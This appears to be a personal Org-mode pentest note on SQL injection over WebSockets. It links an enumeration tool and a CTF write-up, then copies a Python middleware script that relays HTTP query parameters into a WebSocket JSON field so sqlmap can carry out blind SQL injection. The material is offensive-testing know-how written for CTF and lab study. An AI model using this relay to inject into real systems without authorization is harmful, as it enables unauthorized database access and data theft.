:PROPERTIES:
:ID:       61eb9f35-f735-4b5f-a028-0b2fd6ced177
:END:
#+title: SQL Injection
#+filetags: :webSocket:blindSQL:sqli:pentest:
#+hugo_base_dir:../



* SQL Injection


** SQLi - websocket

Enumerate web sockets: [[https://github.com/PalindromeLabs/STEWS][PalindromeLabs]]

[[https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html][rayhan0x01 blind sql injection via websocket]]

From the above post

"If you didn't know, the main difference between HTTP and WebSocket is that HTTP is built on a request-response model whereas WebSocket is like a Socket connection where both client and server can send data anytime asynchronously. So you can't repeat the requests made in WebSocket as you would normally do for HTTP Requests in BurpSuite."


Interact synchronously with websocket in order to, eg, use sqlmap:

Script from rayhan0x01's post:

#+begin_src python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://localhost:8156/ws"

def send_ws(payload):
	ws = create_connection(ws_server)
	# If the server returns a response on connect, use below line
	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here

	# For our case, format the payload in JSON
	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
	data = '{"employeeID":"%s"}' % message

	ws.send(data)
	resp = ws.recv()
	ws.close()

	if resp:
		return resp
	else:
		return ''

def middleware_server(host_port,content_type="text/plain"):

	class CustomHandler(SimpleHTTPRequestHandler):
		def do_GET(self) -> None:
			self.send_response(200)
			try:
				payload = urlparse(self.path).query.split('=',1)[1]
			except IndexError:
				payload = False

			if payload:
				content = send_ws(payload)
			else:
				content = 'No parameters specified!'

			self.send_header("Content-type", content_type)
			self.end_headers()
			self.wfile.write(content.encode())
			return

	class _TCPServer(TCPServer):
		allow_reuse_address = True

	httpd = _TCPServer(host_port, CustomHandler)
	httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
	pass
#+end_src
